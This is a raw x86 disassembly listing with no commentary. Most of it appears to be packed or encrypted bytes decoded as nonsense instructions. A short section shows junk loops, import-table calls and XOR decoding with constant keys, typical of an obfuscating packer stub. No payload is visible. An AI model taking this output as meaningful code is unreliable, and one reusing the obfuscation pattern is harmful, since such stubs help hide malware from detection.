  4028e1:	rcr    eax,0xb7
  4028e4:	pop    ds
  4028e5:	mov    eax,0x3cb71ef8
  4028ea:	nop
  4028eb:	adc    DWORD PTR [ebx+0x44],ebx
  4028ee:	cmp    esi,DWORD PTR [ecx+eiz*1]
  4028f1:	loope  0x40296e
  4028f3:	xor    DWORD PTR [ebx],0x8738ba74
  4028f9:	in     eax,0x7a
  4028fb:	xchg   DWORD PTR [ebp+0x761b7c03],edi
  402901:	jp     0x4028c2
  402903:	jge    0x40295a
  402905:	(bad)  
  402906:	dec    eax
  402907:	pop    esp
  402908:	scas   al,BYTE PTR es:[edi]
  402909:	inc    edx
  40290a:	mov    edx,fs
  40290c:	inc    esi
  40290d:	xor    eax,0x4f30231e
  402912:	pop    ds
  402913:	dec    esp
  402914:	sub    al,0x49
  402916:	mov    bl,0xc1
  402918:	dec    esp
  402919:	stc    
  40291a:	push   cs
  40291b:	cwde   
  40291c:	push   cx
  40291e:	repz or DWORD PTR [esi],esi
  402921:	loope  0x4028b0
  402923:	popa   
  402924:	icebp  
  402925:	scas   al,BYTE PTR es:[edi]
  402926:	dec    edx
  402927:	fimul  WORD PTR [esi+0x3]
  40292a:	cli    
  40292b:	repz into 
  40292d:	push   ss
  40292e:	test   DWORD PTR ds:[eax],ebx
  402931:	dec    esi
  402932:	dec    ebx
  402933:	jge    0x40291a
  402935:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402936:	add    BYTE PTR [ecx],dh
  402938:	gs and al,0x16
  40293b:	test   eax,0xfb78ce08
  402940:	(bad)  
  402941:	rol    BYTE PTR [ebx-0x6f],cl
  402944:	mov    ebx,0xf9015e70
  402949:	pop    es
  40294a:	sbb    al,0xdf
  40294c:	mov    esp,0x9c9b1e4e
  402951:	aas    
  402952:	out    0xf5,eax
  402954:	cwde   
  402955:	jnp    0x402902
  402957:	mov    ch,BYTE PTR [eax+0x26]
  40295a:	dec    esi
  40295b:	and    DWORD PTR [edx],edx
  40295d:	stos   DWORD PTR es:[edi],eax
  40295e:	test   BYTE PTR [eax+ebp*8+0x3df8d918],cl
  402965:	adc    al,0xae
  402967:	pop    esi
  402968:	leave  
  402969:	ret    0x4
  40296c:	push   ebp
  40296d:	mov    ebp,esp
  40296f:	sub    esp,0x28
  402972:	leave  
  402973:	ret    0x10
  402976:	push   ebp
  402977:	mov    ebp,esp
  402979:	push   ecx
  40297a:	or     eax,DWORD PTR ds:0x42fcdd
  402980:	push   ecx
  402981:	movzx  edx,WORD PTR ds:0x42e6ef
  402988:	sbb    DWORD PTR ds:0x42e713,edx
  40298e:	mov    eax,0xf89c8531
  402993:	mov    DWORD PTR ds:0x42fce9,0x1a
  40299d:	cmp    DWORD PTR ds:0x42fce9,0x0
  4029a4:	je     0x402a39
  4029aa:	cmp    DWORD PTR ds:0x42fce9,0x24
  4029b1:	jne    0x4029cc
  4029b7:	push   0x42e12c
  4029bc:	push   0x42e703
  4029c1:	push   0x59d6
  4029c6:	call   DWORD PTR ds:0x42e44f
  4029cc:	mov    edx,DWORD PTR ds:0x42fce9
  4029d2:	dec    edx
  4029d3:	mov    DWORD PTR ds:0x42fce9,edx
  4029d9:	jmp    0x40299d
  4029de:	mov    DWORD PTR ds:0x42e6ff,0x19
  4029e8:	cmp    DWORD PTR ds:0x42e6ff,0x0
  4029ef:	je     0x402a39
  4029f5:	cmp    DWORD PTR ds:0x42e6ff,0x4
  4029fc:	jne    0x402a0d
  402a02:	push   0x5bc5
  402a07:	call   DWORD PTR ds:0x42e2d3
  402a0d:	cmp    DWORD PTR ds:0x42e6ff,0x5
  402a14:	jne    0x402a27
  402a1a:	mov    edx,DWORD PTR ds:0x42e6ff
  402a20:	dec    edx
  402a21:	mov    DWORD PTR ds:0x42e6ff,edx
  402a27:	mov    edx,DWORD PTR ds:0x42e6ff
  402a2d:	dec    edx
  402a2e:	mov    DWORD PTR ds:0x42e6ff,edx
  402a34:	jmp    0x4029e8
  402a39:	mov    DWORD PTR [ebp-0x8],eax
  402a3c:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  402a43:	mov    edx,DWORD PTR [ebp-0x8]
  402a46:	mov    ecx,DWORD PTR ds:0x42fdae
  402a4c:	mov    ecx,DWORD PTR [ecx]
  402a4e:	xor    DWORD PTR ds:0x42fcd5,ecx
  402a54:	push   esi
  402a55:	mov    ecx,0x7510855
  402a5a:	or     DWORD PTR ds:0x42fd0d,ebx
  402a60:	xor    edx,ecx
  402a62:	sbb    esi,0x5361
  402a68:	mov    esi,0x32729c
  402a6d:	sbb    DWORD PTR ds:0x42e128,0x657d
  402a77:	push   edi
  402a78:	and    DWORD PTR ds:0x42e128,0x0
  402a82:	jmp    0x402a94
  402a87:	mov    edi,DWORD PTR ds:0x42e128
  402a8d:	inc    edi
  402a8e:	mov    DWORD PTR ds:0x42e128,edi
  402a94:	cmp    DWORD PTR ds:0x42e128,0x10
  402a9b:	jae    0x402abe
  402aa1:	cmp    DWORD PTR ds:0x42e128,0x11
  402aa8:	jne    0x402ab9
  402aae:	push   0x42e141
  402ab3:	call   DWORD PTR ds:0x42e453
  402ab9:	jmp    0x402a87
  402abe:	mov    edi,DWORD PTR [ebp+0x10]
  402ac1:	add    edx,esi
  402ac3:	cmp    edi,edx
  402ac5:	je     0x4036ba
  402acb:	mov    edx,DWORD PTR [ebp-0x8]
  402ace:	mov    eax,DWORD PTR [ebp-0x4]
  402ad1:	xor    eax,ecx
  402ad3:	mov    edi,0xffcd8d64
  402ad8:	sub    edi,eax
  402ada:	add    edi,DWORD PTR [ebp+0x10]
  402add:	xor    edx,ecx
  402adf:	jmp    0x402dbe
  402ae4:	imul   ebx,DWORD PTR [edx],0xffffff8f
  402ae7:	cmp    BYTE PTR [ebp+0x71],cl
  402aea:	jae    0x402a9d
  402aec:	jl     0x402b40
  402aee:	dec    esi
  402aef:	mov    esp,0x753e7891
  402af4:	jo     0x402b02
  402af6:	jo     0x402b68
  402af8:	mov    esi,0x9270707e
  402afd:	pop    edx
  402afe:	or     al,0x53
  402b00:	arpl   WORD PTR [edi],bx
  402b02:	jo     0x402b15
  402b04:	mov    edx,0x39a8dcac
  402b09:	sahf   
  402b0a:	and    bh,bl
  402b0c:	retf   0x66ae
  402b0f:	out    0xb,al
  402b11:	shl    BYTE PTR [esi-0x33857574],0xb1
  402b18:	add    BYTE PTR [eax-0x3fcc499c],bl
  402b1e:	stos   BYTE PTR es:[edi],al
  402b1f:	out    dx,eax
  402b20:	jbe    0x402b0d
  402b22:	out    0x83,al
  402b24:	or     dh,BYTE PTR [eax-0x1771496d]
  402b2a:	aas    
  402b2b:	sub    eax,0xf4d23482
  402b30:	test   BYTE PTR [edx-0x555becbe],dl
  402b36:	xor    DWORD PTR [eax-0x68],ebx
  402b39:	jp     0x402b47
  402b3b:	cmc    
  402b3c:	inc    edi
  402b3d:	mov    ds:0x41a9a177,eax
  402b42:	hlt    
  402b43:	lahf   
  402b44:	inc    eax
  402b45:	not    BYTE PTR [edx-0x4f94c1f6]
  402b4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b4c:	leave  
  402b4d:	rcl    DWORD PTR [eax-0xb],cl
  402b50:	mov    esi,edi
  402b52:	fcmovb st,st(6)
  402b54:	les    esi,FWORD PTR ds:[esi+0x9]
  402b58:	adc    dh,BYTE PTR [ecx+ecx*8+0x67]
  402b5c:	jmp    FWORD PTR [edi+0xc]
  402b5f:	jno    0x402bbc
  402b61:	call   FWORD PTR [edi]
  402b63:	cmp    esi,esp
  402b65:	jle    0x402b55
  402b67:	xor    DWORD PTR [edi],0xffffffb8
  402b6a:	in     eax,dx
  402b6b:	nop
  402b6c:	in     al,0xb8
  402b6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b6f:	fisubr DWORD PTR [ecx]
  402b71:	lods   al,BYTE PTR ds:[esi]
  402b72:	and    esi,DWORD PTR [edx-0x72]
  402b75:	dec    esp
  402b76:	or     cl,ch
  402b78:	mov    eax,ds:0x4a7a653e
  402b7d:	push   ebx
  402b7e:	and    esi,DWORD PTR [ebx]
  402b80:	call   0xd2849a2f
  402b85:	stos   DWORD PTR es:[edi],eax
  402b86:	xchg   BYTE PTR [ecx+eax*4-0x30d6088d],ch
  402b8d:	xlat   BYTE PTR ds:[ebx]
  402b8e:	add    DWORD PTR [edx-0x34],0x9
  402b92:	xor    al,0x40
  402b94:	dec    eax
  402b95:	enter  0x98ff,0xe0
  402b99:	add    eax,0x1ff220a7
  402b9e:	xchg   edx,eax
  402b9f:	sbb    DWORD PTR [edx],0xfdd0f64d
  402ba5:	sub    ch,BYTE PTR [edx+0x540c3a7c]
  402bab:	pop    edi
  402bac:	jge    0x402ba0
  402bae:	popa   
  402baf:	(bad)  
  402bb0:	dec    edx
  402bb1:	jo     0x402bc1
  402bb3:	fwait
  402bb4:	pusha  
  402bb5:	adc    eax,0xa048733e
  402bba:	push   0xffffffb1
  402bbc:	les    eax,FWORD PTR [ebp+esi*8-0x3e]
  402bc0:	call   0xd482c354
  402bc5:	xor    al,0x37
  402bc7:	xlat   BYTE PTR ds:[ebx]
  402bc8:	xor    DWORD PTR [ebx-0x62],esp
  402bcb:	test   BYTE PTR [ecx-0x7dee0211],bl
  402bd1:	sar    DWORD PTR [ebx-0x56],0xb7
  402bd5:	rcr    DWORD PTR ds:0xf9193b63,0x18
  402bdc:	retf   
  402bdd:	pop    ecx
  402bde:	sub    al,0xf4
  402be0:	ret    
  402be1:	shr    BYTE PTR [esi-0x7c6ca5b6],1
  402be7:	sbb    BYTE PTR [esi],dl
  402be9:	icebp  
  402bea:	xor    al,0x9d
  402bec:	cwde   
  402bed:	pop    esp
  402bee:	iret   
  402bef:	sub    al,0xa9
  402bf1:	xor    edi,DWORD PTR [ecx+0x6fc10ade]
  402bf7:	jno    0x402c11
  402bf9:	out    dx,eax
  402bfa:	push   esp
  402bfb:	lock mov ecx,0xa10b5d5b
  402c01:	lea    ebp,[edi+0x47caca2e]
  402c07:	outs   dx,BYTE PTR ds:[esi]
  402c08:	pushf  
  402c09:	sbb    eax,0x21ecaa84
  402c0e:	mov    eax,0x5c120eb7
  402c13:	retf   
  402c14:	ficomp WORD PTR [ebx]
  402c16:	sti    
  402c17:	in     eax,0x8e
  402c19:	xchg   BYTE PTR [edx+0x79],dl
  402c1c:	fxch   st(1)
  402c1e:	jb     0x402c6e
  402c20:	inc    esp
  402c21:	sub    DWORD PTR [ecx+0x311e3fc8],edi
  402c27:	adc    BYTE PTR [eax+0x1697b020],bl
  402c2d:	xor    bh,cl
  402c2f:	cdq    
  402c30:	xchg   DWORD PTR [edi-0x1],edx
  402c33:	cld    
  402c34:	repz pop ss
  402c36:	cld    
  402c37:	xor    DWORD PTR [edx+0x2588b548],esi
  402c3d:	je     0x402bf9
  402c3f:	out    dx,eax
  402c40:	out    dx,al
  402c41:	cld    
  402c42:	in     eax,dx
  402c43:	mov    DWORD PTR [eax+0x74483c44],0x2cf6033a
  402c4d:	stc    
  402c4e:	push   ds
  402c4f:	mov    edx,0x5a8b31f8
  402c54:	jno    0x402cb2
  402c56:	pop    edi
  402c57:	xor    BYTE PTR [edx+0x1b],bh
  402c5a:	retf   
  402c5b:	cmp    al,0x12
  402c5d:	cmp    ebx,esp
  402c5f:	cmc    
  402c60:	jmp    0x2b31:0xafec7ad7
  402c67:	jae    0x402c6a
  402c69:	dec    ebx
  402c6a:	pop    ebx
  402c6b:	daa    
  402c6c:	fmulp  st(5),st
  402c6e:	fnstsw WORD PTR [ebp+edx*8+0x39]
  402c72:	push   ds
  402c73:	or     bl,BYTE PTR [ecx]
  402c75:	cmc    
  402c76:	stos   BYTE PTR es:[edi],al
  402c77:	popf   
  402c78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c79:	push   ss
  402c7a:	inc    esi
  402c7b:	retf   
  402c7c:	pop    ebp
  402c7d:	test   al,0xab
  402c7f:	xchg   edx,eax
  402c80:	mov    ch,ah
  402c82:	jg     0x402c8f
  402c84:	push   cs
  402c85:	jle    0x402cfe
  402c87:	pop    esi
  402c88:	sahf   
  402c89:	lods   eax,DWORD PTR ds:[esi]
  402c8a:	sub    eax,0xd048b10d
  402c8f:	or     eax,DWORD PTR [edx+ebp*1]
  402c92:	xchg   ecx,eax
  402c93:	jp     0x402cdd
  402c95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c96:	rcr    BYTE PTR [ebx],1
  402c98:	mov    ebp,0xd01f7e7e
  402c9d:	shr    DWORD PTR [ecx-0x4eb0e19f],0x51
  402ca4:	inc    ebx
  402ca5:	out    dx,al
  402ca6:	in     eax,0xdf
  402ca8:	cld    
  402ca9:	mov    edx,0x28d93210
  402cae:	scas   eax,DWORD PTR es:[edi]
  402caf:	mov    cl,0x45
  402cb1:	xchg   esi,eax
  402cb2:	not    BYTE PTR [ebx]
  402cb4:	mov    WORD PTR [esi],ds
  402cb6:	xchg   ebx,eax
  402cb7:	sbb    BYTE PTR ds:0xc17ff236,ch
  402cbd:	mov    eax,0xf6e9d030
  402cc2:	pop    eax
  402cc3:	mov    bl,0x5
  402cc5:	lods   eax,DWORD PTR ds:[esi]
  402cc6:	pop    ss
  402cc7:	inc    ecx
  402cc8:	sub    esp,DWORD PTR ds:0x35847a10
  402cce:	pop    ecx
  402ccf:	retf   0x2e25
  402cd2:	repz push esi
  402cd4:	push   ss
  402cd5:	jo     0x402cc5
  402cd7:	mov    cl,0xd2
  402cd9:	push   esi
  402cda:	imul   esi,DWORD PTR [edi],0xc4e22b18
  402ce0:	sbb    al,0xb1
  402ce2:	dec    esp
  402ce3:	sbb    ecx,ebx
  402ce5:	ret    
  402ce6:	add    bh,bl
  402ce8:	stos   BYTE PTR es:[edi],al
  402ce9:	sbb    DWORD PTR [esi],ecx
  402ceb:	inc    esp
  402cec:	push   cs
  402ced:	cmp    edx,DWORD PTR [edx+0x5deb6390]
  402cf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cf4:	pop    ebp
  402cf5:	aas    
  402cf6:	sahf   
  402cf7:	ficomp DWORD PTR [ebp+ebp*2-0x5ac5d4c4]
  402cfe:	lods   eax,DWORD PTR ds:[esi]
  402cff:	rol    DWORD PTR [edi+eiz*4+0x78],0x29
  402d04:	test   eax,0xc1e41eaa
  402d09:	(bad)  
  402d0b:	xchg   edi,ebx
  402d0d:	int    0x6e
  402d0f:	cwde   
  402d10:	js     0x402cd4
  402d12:	push   0x9e9e2abc
  402d17:	cmp    al,0xcb
  402d19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d1a:	add    DWORD PTR [esi+0x37a59e19],ecx
  402d20:	cmp    ecx,DWORD PTR [eax]
  402d22:	jns    0x402cca
  402d24:	inc    edi
  402d25:	mov    ds:0x8b84ab2d,al
  402d2a:	xchg   ebp,eax
  402d2b:	mov    BYTE PTR [ebx],dh
  402d2d:	popa   
  402d2e:	dec    ecx
  402d2f:	inc    esi
  402d30:	es dec eax
  402d32:	imul   ebp,DWORD PTR [ecx],0xffffffe5
  402d35:	int3   
  402d36:	ins    DWORD PTR es:[edi],dx
  402d37:	adc    bl,BYTE PTR [edx]
  402d39:	scas   al,BYTE PTR es:[edi]
  402d3a:	push   ds
  402d3b:	xor    al,0x92
  402d3d:	gs pop edi
  402d3f:	push   esp
  402d40:	icebp  
  402d41:	and    eax,0xa91c9e2b
  402d46:	sbb    bl,BYTE PTR [ecx]
  402d48:	xor    al,0x9
  402d4a:	push   ds
  402d4b:	daa    
  402d4c:	pop    es
  402d4d:	shl    DWORD PTR [edx+0x0],1
  402d50:	dec    ecx
  402d51:	pop    edx
  402d52:	fwait
  402d53:	out    0x91,eax
  402d55:	fcomp  st(5)
  402d57:	push   esp
  402d58:	push   0x2f
  402d5a:	stc    
  402d5b:	mov    BYTE PTR [esi],bh
  402d5d:	fmul   QWORD PTR [esp+ecx*4]
  402d60:	call   0x9059:0x4af3fcfd
  402d67:	rcr    esp,cl
  402d69:	cmc    
  402d6a:	in     eax,0x6e
  402d6c:	add    edx,DWORD PTR [ebx+0x5bd977ff]
  402d72:	in     eax,dx
  402d73:	mov    edi,0xeb2842d1
  402d78:	pop    esi
  402d79:	and    BYTE PTR [eax],bh
  402d7b:	fisttp WORD PTR [edi+0x7]
  402d7e:	inc    ebp
  402d7f:	sahf   
  402d80:	mov    cs,WORD PTR [esp+ecx*4]
  402d83:	inc    eax
  402d84:	sbb    eax,0x89b7ef29
  402d89:	mov    edi,0x9c4730d2
  402d8e:	push   edi
  402d8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d90:	and    al,0x62
  402d92:	inc    ecx
  402d93:	or     BYTE PTR [esi],bh
  402d95:	push   ebx
  402d96:	or     BYTE PTR [ebx],ch
  402d98:	inc    esp
  402d99:	(bad)  
  402d9a:	lods   eax,DWORD PTR ds:[esi]
  402d9b:	inc    ecx
  402d9c:	mov    eax,ds:0xa5ddd46e
  402da1:	sub    ah,BYTE PTR [esi+0x53]
  402da4:	cwde   
  402da5:	aas    
  402da6:	xor    DWORD PTR [ebx+eiz*8-0x23f2acef],eax
  402dad:	xor    BYTE PTR [ebx+0x76],bh
  402db0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402db1:	push   0xffffffe3
  402db3:	test   esp,ebp
  402db5:	push   ebx
  402db6:	inc    ebx
  402db7:	xchg   esi,eax
  402db8:	xor    DWORD PTR [ebp-0x48],ebp
  402dbb:	sbb    al,0x84
  402dbd:	leave  
  402dbe:	add    edx,esi
  402dc0:	cmp    edx,edi
  402dc2:	ja     0x4036b5
  402dc8:	push   ebx
  402dc9:	jmp    0x4030b2
  402dce:	jmp    0x4030ad
  402dd3:	mov    ecx,0xe1afe4fc
  402dd8:	ja     0x402e2b
  402dda:	push   0xffffffa6
  402ddc:	aas    
  402ddd:	xchg   ebp,eax
  402dde:	out    dx,eax
  402ddf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402de0:	lods   al,BYTE PTR ds:[esi]
  402de1:	pop    ebx
  402de2:	mov    al,ds:0x70700abe
  402de7:	mov    esi,0xc770707e
  402dec:	and    al,0xbc
  402dee:	mov    dh,0x68
  402df0:	stos   DWORD PTR es:[edi],eax
  402df1:	mov    dl,0x88
  402df3:	or     al,0x0
  402df5:	sub    ecx,ebx
  402df7:	loopne 0x402d7c
  402df9:	jmp    0x5b40:0x3273dd42
  402e00:	xor    DWORD PTR [edi-0x37],ecx
  402e03:	out    dx,al
  402e04:	mov    ss,WORD PTR [edx+0x6c6847ba]
  402e0a:	inc    ecx
  402e0b:	outs   dx,DWORD PTR ds:[esi]
  402e0c:	pusha  
  402e0d:	stos   BYTE PTR es:[edi],al
  402e0e:	ficomp WORD PTR [eax]
  402e10:	xchg   ecx,eax
  402e11:	cmp    eax,0x830097b4
  402e16:	xchg   DWORD PTR [edi+0x317f6676],edx
  402e1c:	cdq    
  402e1d:	outs   dx,BYTE PTR ds:[esi]
  402e1e:	mov    edi,0x67dd7a4d
  402e23:	jmp    0x402db5
  402e25:	jmp    0x5c51:0x97477a89
  402e2c:	mov    al,0xe3
  402e2e:	sub    dh,al
  402e30:	inc    edx
  402e31:	ror    BYTE PTR [ecx-0x40],cl
  402e34:	mov    eax,ds:0x624a938f
  402e39:	push   esp
  402e3a:	ret    0x8364
  402e3d:	add    eax,0xb7d490c5
  402e42:	adc    edx,DWORD PTR [esi+0x4604bcec]
  402e48:	push   ebx
  402e49:	pusha  
  402e4a:	dec    ebp
  402e4b:	xor    dl,ah
  402e4d:	scas   eax,DWORD PTR es:[edi]
  402e4e:	into   
  402e4f:	sahf   
  402e50:	mov    edx,0xd9a315ab
  402e55:	lea    ebx,[esp+ebx*8]
  402e58:	fiadd  DWORD PTR [edx+0x30ac1eed]
  402e5e:	add    al,0x38
  402e60:	retf   0x66b1
  402e63:	sub    BYTE PTR [ecx+0x3bcf83ef],al
  402e69:	dec    esi
  402e6a:	dec    edx
  402e6b:	sub    BYTE PTR [ebx],dh
  402e6d:	imul   ebp,DWORD PTR [ebx-0x34],0x36d7058b
  402e74:	xor    bh,bl
  402e76:	xchg   BYTE PTR [edx+ecx*2-0xf],ch
  402e7a:	push   edx
  402e7b:	or     al,0x2
  402e7d:	dec    ecx
  402e7e:	mov    ecx,DWORD PTR [edi-0x59]
  402e81:	lea    ebx,[ebp*8-0x40a9c223]
  402e88:	mov    ds:0x9478211,al
  402e8d:	ror    DWORD PTR [esi+0x1d85a73b],cl
  402e93:	pusha  
  402e94:	gs ins DWORD PTR es:[edi],dx
  402e96:	fmul   QWORD PTR [eax-0x41]
  402e99:	adc    DWORD PTR [esi],edx
  402e9b:	int3   
  402e9c:	xor    ecx,DWORD PTR [edi-0x599ec02]
  402ea2:	dec    esi
  402ea3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ea4:	popf   
  402ea5:	cwde   
  402ea6:	xchg   ebp,eax
  402ea7:	scas   eax,DWORD PTR es:[edi]
  402ea8:	jle    0x402e89
  402eaa:	dec    ecx
  402eab:	cdq    
  402eac:	inc    BYTE PTR [ecx+0x1e]
  402eaf:	cwde   
  402eb0:	sbb    bh,BYTE PTR [edx+ebx*4-0x18]
  402eb4:	out    0x46,eax
  402eb6:	sub    edi,eax
  402eb8:	inc    eax
  402eb9:	xchg   ebx,eax
  402eba:	sub    ebp,DWORD PTR [eax-0x6d9c48a9]
  402ec0:	and    dh,bl
  402ec2:	mov    BYTE PTR [edx],ch
  402ec4:	sbb    bh,BYTE PTR gs:[ebp+eax*2-0x522d38c8]
  402ecc:	xor    DWORD PTR [ecx-0x60],ebp
  402ecf:	adc    al,0x64
  402ed1:	sar    DWORD PTR [esi+0x9296311],0x1e
  402ed8:	sar    BYTE PTR [ecx],cl
  402eda:	xchg   ebp,eax
  402edb:	fild   DWORD PTR [eax-0x26]
  402ede:	(bad)  
  402ee0:	popf   
  402ee1:	xchg   ebp,eax
  402ee2:	or     al,ah
  402ee4:	pop    esi
  402ee5:	int    0x1e
  402ee7:	stos   BYTE PTR es:[edi],al
  402ee8:	data16 cld 
  402eea:	xchg   edi,eax
  402eeb:	lahf   
  402eec:	iret   
  402eed:	std    
  402eee:	dec    esi
  402eef:	cdq    
  402ef0:	adc    ebp,DWORD PTR [ecx+ebx*2-0x37]
  402ef4:	push   edi
  402ef5:	or     al,0x33
  402ef7:	cmp    al,0x7f
  402ef9:	xchg   ebp,eax
  402efa:	in     eax,dx
  402efb:	sbb    al,0x91
  402efd:	sbb    al,0x34
  402eff:	(bad)  
  402f01:	shr    DWORD PTR [esi-0x4c9bd125],1
  402f07:	mov    ?,WORD PTR [edx+0xf]
  402f0a:	dec    ecx
  402f0b:	test   BYTE PTR [ebp+0x5a],bh
  402f0e:	mov    ebp,0xf3624943
  402f13:	out    0x1b,al
  402f15:	and    BYTE PTR [esp+esi*1],0x85
  402f19:	and    BYTE PTR [esi+0x5a9be8a3],ah
  402f1f:	stos   DWORD PTR es:[edi],eax
  402f20:	pop    es
  402f21:	ja     0x402f61
  402f23:	fnsave [edx+ebp*8-0x1d]
  402f27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f28:	push   0x5091dd98
  402f2d:	loop   0x402f8e
  402f2f:	xor    bl,bh
  402f31:	cld    
  402f32:	fcmovnb st,st(0)
  402f34:	mov    ebp,0xa6f894c0
  402f39:	fbld   TBYTE PTR [edx-0x49]
  402f3c:	scas   eax,DWORD PTR es:[edi]
  402f3d:	adc    al,0x54
  402f3f:	repz jb 0x402f80
  402f42:	xchg   edi,eax
  402f43:	or     ah,BYTE PTR [ebp-0xd3d32c5]
  402f49:	dec    eax
  402f4a:	xchg   BYTE PTR [ecx+edx*1],bl
  402f4d:	aaa    
  402f4e:	pusha  
  402f4f:	addr16 pop edi
  402f51:	inc    esp
  402f52:	cld    
  402f53:	icebp  
  402f54:	adc    edx,DWORD PTR [eax+0x38]
  402f57:	inc    edx
  402f58:	out    0x1e,al
  402f5a:	sbb    eax,0x263ae458
  402f5f:	popa   
  402f60:	fmulp  st(6),st
  402f62:	inc    edx
  402f63:	jnp    0x402fb8
  402f65:	xchg   esi,eax
  402f66:	sub    ebx,DWORD PTR [ebx]
  402f68:	outs   dx,DWORD PTR ds:[esi]
  402f69:	sbb    DWORD PTR [ebp+0x4901b43f],ebx
  402f6f:	(bad)  
  402f70:	fidivr WORD PTR [esi-0x30afab10]
  402f76:	jle    0x402f70
  402f78:	xor    eax,0x976285f9
  402f7d:	xchg   BYTE PTR [edi+edx*4-0x7a],dl
  402f81:	ja     0x402fed
  402f83:	xchg   ecx,eax
  402f85:	in     eax,0xfc
  402f87:	xlat   BYTE PTR ds:[ebx]
  402f88:	cmp    DWORD PTR [ebx],esp
  402f8a:	xchg   esi,eax
  402f8b:	daa    
  402f8c:	sub    ecx,eax
  402f8e:	adc    esp,0xffffff91
  402f91:	cmp    ch,BYTE PTR [ecx-0x4c]
  402f94:	jnp    0x402fe1
  402f96:	or     al,0x85
  402f98:	std    
  402f99:	pop    ebp
  402f9a:	sub    ebp,DWORD PTR [ebx+0x7dc5653a]
  402fa0:	xchg   ebx,eax
  402fa1:	adc    al,0xb2
  402fa3:	imul   edx,edx,0xfffffff6
  402fa6:	push   edx
  402fa7:	pop    ecx
  402fa8:	rcl    BYTE PTR [edx+0x29333f2a],1
  402fae:	aas    
  402faf:	sbb    edx,DWORD PTR gs:[esi-0x38]
  402fb3:	inc    edi
  402fb4:	pop    edi
  402fb5:	ins    BYTE PTR es:[edi],dx
  402fb6:	mov    al,0x6e
  402fb8:	inc    ecx
  402fb9:	sbb    BYTE PTR fs:[ecx+0x73],bh
  402fbd:	mov    ds:0x5f011bbe,al
  402fc2:	test   al,0xd9
  402fc4:	std    
  402fc5:	shl    DWORD PTR [esi],0xb4
  402fc8:	test   al,0xfb
  402fca:	icebp  
  402fcb:	js     0x402f5e
  402fcd:	bound  esi,QWORD PTR [esp+esi*4+0x33d005ec]
  402fd4:	(bad)  
  402fd5:	mov    ds:0x8af84a32,al
  402fda:	mov    ah,0xc5
  402fdc:	and    DWORD PTR [eax-0x729b6e86],ecx
  402fe2:	mov    edx,0x1e5a74a
  402fe7:	call   0xec0c35a6
  402fec:	mov    ch,0xfa
  402fee:	pop    ss
  402fef:	mov    ah,0x41
  402ff1:	mov    cl,0x4c
  402ff3:	jo     0x403063
  402ff5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ff6:	mov    DWORD PTR ss:[ecx+edx*4+0x64],ecx
  402ffb:	pop    esi
  402ffc:	dec    eax
  402ffd:	pop    es
  402ffe:	push   cs
  402fff:	sub    ah,ch
  403001:	inc    esi
  403002:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403003:	call   0xe0aba665
  403008:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40300a:	jo     0x403035
  40300c:	push   es
  40300d:	sub    bh,cl
  40300f:	aad    0xeb
  403011:	inc    esi
  403012:	lahf   
  403013:	shr    BYTE PTR [edx+0x76],cl
  403016:	cmp    BYTE PTR [ecx],0x6c
  403019:	sub    ebp,DWORD PTR [esi]
  40301b:	pop    esp
  40301c:	in     al,0x17
  40301e:	test   al,0xf6
  403020:	xor    al,0x3d
  403022:	xor    ah,dl
  403024:	imul   eax,DWORD PTR [ebp-0x6e],0x47
  403028:	mov    ebp,0x5fe44e79
  40302d:	add    al,0xaa
  40302f:	ins    DWORD PTR es:[edi],dx
  403030:	dec    eax
  403031:	xchg   edx,eax
  403032:	mov    edi,0x74b4af07
  403037:	and    edx,0xfffffffe
  40303a:	popf   
  40303b:	fstp   QWORD PTR [eax+eiz*2+0x7d0bb0bb]
  403042:	dec    edx
  403043:	les    ecx,FWORD PTR [ecx-0x10c78da3]
  403049:	adc    DWORD PTR [eax-0x28],edx
  40304c:	addr16 pop esi
  40304e:	repnz (bad) 
  403050:	aad    0xef
  403052:	pop    ss
  403053:	ret    0x5ec9
  403056:	aam    0x71
  403058:	std    
  403059:	or     ebp,DWORD PTR [edx-0x6af4db0a]
  40305f:	mov    ds:0x51334b6d,al
  403064:	xor    al,0xe5
  403066:	jmp    0x367e11df
  40306b:	out    0xb3,eax
  40306d:	(bad)  
  40306e:	je     0x40309f
  403070:	scas   eax,DWORD PTR es:[edi]
  403071:	ficom  DWORD PTR [edi-0x53]
  403074:	and    esp,edi
  403076:	xor    DWORD PTR [edi+0x2107bb18],ebx
  40307c:	sbb    DWORD PTR [eax+0x60eb0e77],ebx
  403082:	pop    edx
  403083:	sahf   
  403084:	and    ebx,edi
  403086:	in     eax,dx
  403087:	push   cs
  403088:	mov    esi,0xaca9cfd0
  40308d:	ja     0x403037
  40308f:	int3   
  403090:	jp     0x4030a0
  403092:	push   edi
  403093:	push   eax
  403094:	ret    
  403095:	ss xchg ebx,eax
  403097:	jae    0x403068
  403099:	out    0x8a,al
  40309b:	lea    edx,[esp+ebp*4]
  40309e:	gs test eax,0x67b467dc
  4030a4:	call   0xcd08a57b
  4030a9:	ror    BYTE PTR [ecx+ebp*1+0x4e],0xbe
  4030ae:	pushf  
  4030af:	jb     0x4030e3
  4030b1:	add    BYTE PTR [ebx+0x7d8bf845],cl
  4030b7:	cld    
  4030b8:	xor    edi,ecx
  4030ba:	add    edi,esi
  4030bc:	jmp    0x40339b
  4030c1:	fist   DWORD PTR [ecx+0x4b76cc16]
  4030c7:	loope  0x40307a
  4030c9:	lds    edx,FWORD PTR [esi-0x42]
  4030cc:	add    al,0xb8
  4030ce:	push   0xffffff83
  4030d0:	dec    esp
  4030d1:	cld    
  4030d2:	pop    ss
  4030d3:	jo     0x403145
  4030d5:	mov    esi,0x5a70707e
